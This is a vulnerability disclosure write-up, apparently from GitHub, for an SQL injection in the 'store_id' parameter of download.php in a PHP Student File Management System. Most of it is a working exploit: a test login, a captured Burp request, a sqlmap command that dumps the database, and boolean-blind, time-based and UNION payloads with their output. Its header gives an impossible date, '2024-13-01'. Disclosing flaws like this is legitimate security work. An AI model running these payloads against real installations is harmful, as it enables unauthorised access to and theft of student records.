# 2024_Student_File_System_SQL_-Injection

+ **Exploit Title:** 2024_Student_File_System_SQL_-Injection
+ **Date:** 2024-13-01
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/student-file-management-system-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/3e3502a1-11ea-4e87-9d05-12d6204789d6
+ **Version:** 1.0(2024)
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number

## Description:
Student File Managment System 2024 allows SQL Injection via parameter 'store_id' in "/SFMS/download.php?store_id=5". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latest vulnerabilities in the underlying database

## Proof of Concept:
+ Go to the Student Dashboard: "http://localhost/sfms/"
+ Fill in the Student ID and Password with `1353`:`password` and login.
+ Student Details: 
"http://localhost/sfms/student_profile.php"
+ Copy the link to the File Download button. 
+ And receive the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /SFMS/download.php?store_id=5 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```
+ Use sqlmap to exploit. In sqlmap, use 'store_id' parameter to dump the database.
```
sqlmap -r r.txt -p store_id --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
Parameter: store_id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: store_id=5' AND 8329=8329-- xGzO

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: store_id=5' AND (SELECT 2163 FROM (SELECT(SLEEP(5)))YwjC)-- nIjk

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: store_id=-6687' UNION ALL SELECT NULL,CONCAT(0x71627a7171,0x726c465a49424e6674617248747642664f534f716f674e774e59424f6f66456e424249774a4b797a,0x7178766271),NULL,NULL,NULL-- -
```
+ Current Database : `db_sfms`
![Ekran görüntüsü 2024-01-13 165828](https://github.com/BurakSevben/2024_Student_File_System_SQL_-njection/assets/117217689/7ddff51a-1870-45f9-b901-f5096e16dd88)


